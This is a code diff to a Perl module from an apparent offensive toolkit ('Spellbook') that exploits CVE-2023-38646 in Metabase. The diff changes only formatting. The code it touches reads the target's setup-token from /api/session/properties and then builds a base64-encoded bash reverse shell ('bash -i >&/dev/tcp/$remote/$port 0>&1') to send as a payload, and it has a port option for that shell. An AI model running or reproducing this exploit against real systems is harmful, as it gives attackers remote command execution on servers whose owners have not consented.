@@ -19,14 +19,13 @@ package Spellbook::Advisory::CVE_2023_38646 {
             "p|port=i"   => \$port
         );
 
-        if ($target) {    
-            if ($target !~ /^http(s)?:\/\//) { 
+        if ($target) {
+            if ($target !~ /^http(s)?:\/\//) {
                 $target = "https://$target";
             }
 
             my $userAgent = Spellbook::Core::UserAgent -> new();
-
-            my $request = $userAgent -> get("$target/api/session/properties");
+            my $request   = $userAgent -> get("$target/api/session/properties");
 
             if ($request -> code() == 200) {
                 try {
@@ -34,10 +33,7 @@ package Spellbook::Advisory::CVE_2023_38646 {
                     my $token = $content -> {"setup-token"};
 
                     if ($token) {
-                        my $headers = HTTP::Headers -> new (
-                            "Content-Type" => "application/json"
-                        );
-
+                        my $headers = HTTP::Headers -> new ("Content-Type" => "application/json");
                         my $reverse = encode_base64("bash -i >&/dev/tcp/$remote/$port 0>&1", "");
 
                         my $payload = qq({
@@ -83,7 +79,7 @@ package Spellbook::Advisory::CVE_2023_38646 {
                 \r-p, --port     Set the port of reverse shell\n\n";
         }
 
-        return 0;   
+        return 0;
     }
 }
 
